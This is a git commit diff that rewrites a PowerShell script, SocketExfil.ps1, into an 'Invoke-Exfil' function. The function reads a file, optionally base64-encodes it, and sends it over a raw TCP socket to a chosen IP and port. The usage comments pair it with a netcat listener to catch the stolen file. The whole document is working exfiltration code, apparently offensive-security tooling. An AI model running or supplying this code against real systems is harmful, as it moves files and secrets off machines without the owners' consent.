60df4b5438b78f6a92acde1b17751b09de93daa9
MaxJackson13 <72030655+MaxJackson13@users.noreply.github.com>
2022-11-22 16:37:07 +0000

    Update SocketExfil.ps1

--- SocketExfil.ps1
+++ SocketExfil.ps1
@@ -1,26 +1,44 @@
-Function Send-File () {
-        #.Synopsis
-        # Sends a file through a socket to be received by a listener on the target machine.
-        # Run . .\SocketExfil.ps1 in the directory containing the file
+Function Invoke-Exfil () {
+        <#
+        SYNOPSIS
+            Sends a file through a socket to be received by a listener on the target machine.
+        USAGE
+                First source the file (. .\SocketExfil.ps1)
+                
+                Plaintext:
+                Server: Invoke-Exfil -IP 10.10.10.10 -Port 9001 -Path .\test.txt
+                Client: nc -nvlp 9001 > test.txt
 
-        # Usage (plaintext):
-        # Server: Send-File -Target 10.10.10.10 -Port 9001 -Path .\test.txt
-        # Client: nc -nvlp 9001 > test.txt
-
-        # Usage (base64-encoded):
-        # Server: Send-File -Target 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded $true
-        # Client: nc -nvlp 9001 > b64test.txt
-        ###################################################################################
+                Usage (base64-encoded):
+                Server: Invoke-Exfil -IP 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded
+                Client: nc -nvlp 9001 > b64test.txt        
+        #>
         
-        param($Target, $Port, $Path, [bool[]]$Encoded=$false)
-       
-        $string = switch($Encoded){
-                $true { [System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([io.file]::ReadAllBytes($Path))) }
-                default { [io.file]::ReadAllBytes($Path) }
-            }
-        $socket = New-object System.Net.Sockets.TcpClient($Target,$Port)
-        $stream = $socket.GetStream()
-        $stream.Write($string, 0, $string.Length)
-        $stream.close()
-        $socket.close()
+        param([int]$Port, [string]$IP, [System.IO.FileInfo]$Path, [switch]$Encoded)
+        
+        # Create endpoint
+        $Address = [system.net.IPAddress]::Parse($IP)
+        $Endpoint = New-Object System.Net.IPEndPoint $Address, $Port
+
+        # Create Socket 
+        $Addrf = [System.Net.Sockets.AddressFamily]::InterNetwork
+        $Socktype = [System.Net.Sockets.SocketType]::Stream
+        $Proto = [System.Net.Sockets.ProtocolType]::TCP
+        $Sock = New-Object System.Net.Sockets.Socket $Addrf, $Socktype, $Proto
+
+        # Connect to socket 
+        $Sock.Connect($Endpoint)
+
+        # Create buffer  
+        if ($Encoded){
+                $Buffer=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([io.file]::ReadAllBytes($Path)))
+        }
+
+        else {
+                $Buffer=[io.file]::ReadAllBytes($Path)
+        }
+        
+        # Send the buffer 
+        $Sent = $Sock.Send($Buffer)
+        "{0} bytes sent to: {1} " -f $Sent,$IP
 }
